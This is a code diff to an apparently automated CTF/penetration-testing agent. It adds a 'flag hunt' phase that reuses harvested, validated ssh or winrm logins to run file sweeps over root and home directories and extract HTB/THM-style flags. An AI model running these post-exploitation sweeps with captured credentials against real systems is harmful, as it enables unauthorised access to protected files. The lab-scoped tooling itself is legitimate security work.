@@ -5241,6 +5241,135 @@ def _run_cred_harvest(eng: dict) -> None:
         style=("green" if valid else "bright_black"))))
 
 
+# ── phase 5 flag hunt (loot the usual paths with a working login) ─────────────
+# Once we hold a VALIDATED shell login, use it to read the common flag/secret spots for
+# a target-only capture: a read-only file sweep — cat/find on Linux over ssh_exec,
+# Get-ChildItem/Get-Content on Windows over winrm. Bounded, cancel-aware, and it stops
+# as soon as a flag is captured. Services without a shell/filesystem (db/redis/…) are
+# skipped; smb-exec (needs admin, cmd-vs-powershell quirks) is left for a later pass.
+FLAG_HUNT_MAX = 8                 # hard cap on loot commands per host
+FLAG_HUNT_BUDGET_MINUTES = 5      # wall-clock ceiling for the flag hunt
+_FLAG_HUNT_TIMEOUT = 60           # seconds per loot command
+_LOOT_SERVICES = {"ssh", "winrm"}    # services that give real command execution
+
+# a flag literal (flag{…}, HTB{…}, THM{…}, picoCTF{…}) …
+_FLAG_RE = re.compile(r"\b(?:flag|HTB|THM|FLAG|picoCTF|CTF)\{[^}\r\n]{1,200}\}")
+# … or a bare 32-hex token on its own line (HTB user.txt / root.txt)
+_HASH32_LINE = re.compile(r"^[0-9a-fA-F]{32}$")
+
+# One read-only sweep per platform, run in a single login. Kept to one line each: the
+# exec tools reject control characters, so no real newlines are allowed in the command.
+_NIX_LOOT = (
+    "cat /root/root.txt /root/flag.txt /root/flag /home/*/user.txt /home/*/flag.txt "
+    "/home/*/flag /flag /flag.txt /var/www/flag* 2>/dev/null; "
+    "find / -maxdepth 5 -type f -iname 'flag*' 2>/dev/null | head -n 20; "
+    "find / -maxdepth 5 -type f \\( -iname 'user.txt' -o -iname 'root.txt' \\) "
+    "2>/dev/null | head -n 20"
+)
+_WIN_LOOT = (
+    "Get-ChildItem C:\\Users,C:\\ -Recurse -Include user.txt,root.txt,flag.txt,flag "
+    "-ErrorAction SilentlyContinue -File | Select-Object -First 20 | "
+    "ForEach-Object { $_.FullName; Get-Content $_.FullName -ErrorAction SilentlyContinue }"
+)
+
+
+def _loot_command(cred: dict, host: str, port: int, key: str):
+    """(tool, args) that runs the read-only loot sweep over this service's login tool,
+    reusing the validation arg-builders (which already handle key/password/hash), or
+    None when the credential can't drive a shell here."""
+    if key == "ssh":
+        built, loot = _v_ssh(cred, host, port), _NIX_LOOT
+    elif key == "winrm":
+        built, loot = _v_winrm(cred, host, port), _WIN_LOOT
+    else:
+        return None
+    if not built:
+        return None
+    tool, args = built
+    args = dict(args)
+    args["command"] = loot
+    return tool, args
+
+
+def _extract_flags(text: str) -> list:
+    """Flag-looking strings in command output: flag{…}/HTB{…} literals plus bare 32-hex
+    tokens on their own line (HTB user.txt/root.txt). Order-preserving, deduped."""
+    out = list(_FLAG_RE.findall(text or ""))
+    for line in (text or "").splitlines():
+        s = line.strip()
+        if _HASH32_LINE.match(s):
+            out.append(s)
+    seen: set = set()
+    return [x for x in out if not (x in seen or seen.add(x))]
+
+
+def _print_flag_hit(key: str, flag: str) -> None:
+    line = Text("  ")
+    line.append("[flag]", style="bold green")
+    line.append(f" ▸ loot · {key}  ", style="green")
+    line.append(flag, style="bold yellow")
+    console.print(line)
+
+
+def _run_flag_hunt(eng: dict) -> None:
+    """Phase-5 flag hunt: with a validated shell login, sweep the usual flag/secret
+    locations for a capture. Bounded and cancel-aware; a clean no-op when the host has
+    no shell-capable service or no validated credential."""
+    ctx = eng["ctx"]
+    mcp = ctx.get("mcp")
+    if mcp is None or eng.get("cancelled"):
+        return
+    base, tid, host = eng["base_dir"], eng["tid"], eng["ip"]
+    present = _present_services(base, tid)
+    targets = {k: present[k] for k in present if k in _LOOT_SERVICES}
+    if not targets:
+        return
+    creds = [c for c in purragent_db.fetch_credentials(base, tid)
+             if c.get("validated") == 1]
+    if not creds:
+        return
+    _post(ctx, lambda: console.print(Text(
+        "  ▸ flag hunt — search the usual paths with a validated login",
+        style="bright_black")))
+    budget = [FLAG_HUNT_MAX]
+    deadline = time.time() + FLAG_HUNT_BUDGET_MINUTES * 60
+    seen_flags: set = set()
+    for c in creds:
+        if seen_flags or eng.get("cancelled") or budget[0] <= 0 or time.time() > deadline:
+            break
+        hint = c.get("service_hint") or "*"
+        keys = list(targets) if hint == "*" else ([hint] if hint in targets else [])
+        for key in keys:
+            if eng.get("cancelled") or budget[0] <= 0 or time.time() > deadline:
+                break
+            built = _loot_command(c, host, targets[key][0], key)
+            if not built:
+                continue
+            tool, args = built
+            budget[0] -= 1
+            name = mcp_client._namespaced("hacktools", tool)
+            try:
+                res = mcp.call(name, args, timeout=_FLAG_HUNT_TIMEOUT)
+            except Exception:                              # noqa: BLE001
+                continue
+            port = targets[key][0]
+            for flag in _extract_flags(res.get("text") or ""):
+                if flag in seen_flags:
+                    continue
+                seen_flags.add(flag)
+                finding = f"flag captured via {key} ({_cred_display(c)}): {flag}"
+                purragent_db.add_exploit_finding(base, tid, port, "tcp", key,
+                                                 "flag-hunt", "", finding)
+                eng.setdefault("exploit_findings", []).append(
+                    {"port": port, "finding": finding})
+                _post(ctx, lambda k=key, fl=flag: _print_flag_hit(k, fl))
+            if seen_flags:
+                break
+    if not seen_flags and not eng.get("cancelled"):
+        _post(ctx, lambda: console.print(Text(
+            "    no flag found in the usual locations", style="bright_black")))
+
+
 # ── phase 5 credential derivation (deduced guesses, validated before brute) ────
 # A narrow, quiet tier between validation and brute: build candidate logins DEDUCED from
 # what we already know — username-as-password (kali:kali), known-password × known-username
@@ -5712,6 +5841,7 @@ def _exploit_worker(eng: dict) -> None:
             _run_service_review(eng, port, proto, key, label, svc_finds, ran_cmds)
     _run_cred_harvest(eng)                             # seed/extract/validate credentials
     _run_cred_derivation(eng)                          # deduced logins (before brute)
+    _run_flag_hunt(eng)                                # loot common flag paths with valid logins
     _run_exploit_agent(eng)                            # cross-service correlation (now has creds)
 
     def _finish():                                     # summary + close-out
